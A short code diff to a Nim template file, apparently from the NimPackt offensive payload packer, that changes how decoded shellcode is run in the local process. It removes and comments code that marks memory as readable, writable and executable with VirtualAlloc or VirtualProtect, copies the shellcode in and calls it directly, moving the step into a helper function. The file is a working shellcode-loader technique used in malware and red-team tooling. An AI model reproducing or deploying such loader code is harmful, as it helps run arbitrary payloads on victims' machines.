@@ -1,20 +1,19 @@
     #[ 
         NimPackt-Template-Shinject.nim starts here
     ]#
-    var allocated = VirtualAlloc(nil, len(decoded), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
-    doAssert not allocated.isNil(), "Error executing VirtualAlloc()"
-    copyMem(allocated, decoded[0].addr, len(decoded))
-    
-    let f = cast[proc(){.nimcall.}](allocated)
-    f()
+    if verbose:
+        echo "[*] Executing shellcode in local thread..."
+
+    # Run shellcode using VirtualAlloc(), see base template (same as shellycoat)
+    rscva(decodedPay)
 
     #[
         ALTERNATIVELY, use VirtualAlloc() and execute
 
             var oldProtect : DWORD
-            var ret = VirtualProtect(decoded.addr, len(decoded), PAGE_EXECUTE_READWRITE, oldProtect.addr)
+            var ret = VirtualProtect(decodedPay.addr, len(decodedPay), PAGE_EXECUTE_READWRITE, oldProtect.addr)
             doAssert ret != 0, "Error executing VirtualProtect()"
             
-            let f = cast[proc(){.nimcall.}](decoded.addr)
+            let f = cast[proc(){.nimcall.}](decodedPay.addr)
             f()
     ]#
